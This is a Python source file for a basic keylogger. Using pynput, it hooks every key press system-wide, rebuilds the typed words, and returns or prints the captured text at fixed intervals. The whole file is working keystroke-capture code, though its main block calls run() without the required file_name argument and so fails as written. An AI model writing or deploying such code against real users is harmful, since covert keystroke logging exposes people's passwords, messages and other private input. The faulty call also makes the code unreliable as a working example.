import time
from pynput.keyboard import Listener
from threading import Thread

last_key_pressed_time = time.time()
all_words = ""
word = ""

def process_key(key):
    global word
    global all_words
    global last_key_pressed_time

    if time.time() - last_key_pressed_time > 10:
        word += "\n"
        all_words += word
        word = ""

    if key == "backspace":
        word = word[:len(word) - 1] if (len(word) > 0) else ""
    elif key == "space":
        word += " "
        all_words += word
        word = ""
    elif key == "enter":
        word += "\n"
        all_words += word
        word = ""
    else:
        word += key

    last_key_pressed_time = time.time()


def on_press(key):
    try:
        c = key.char
        process_key(c)

    except AttributeError:
        sp = str(key).split(".")[1]
        if sp == "space" or sp == "enter" or sp == "backspace":
            process_key(sp)  

def start_listener(reload_interval=3600):
    with Listener(on_press=on_press) as listener:        
        def stopper():
            time.sleep(reload_interval)
            listener.stop()

        Thread(target=stopper).start()
        listener.join()

def run(file_name, reload_interval=3600):
    global all_words
    all_words = ""

    start_listener(reload_interval)

    return all_words

if __name__ == "__main__":
    while True:
        r = run(reload_interval=15)
        print(r)
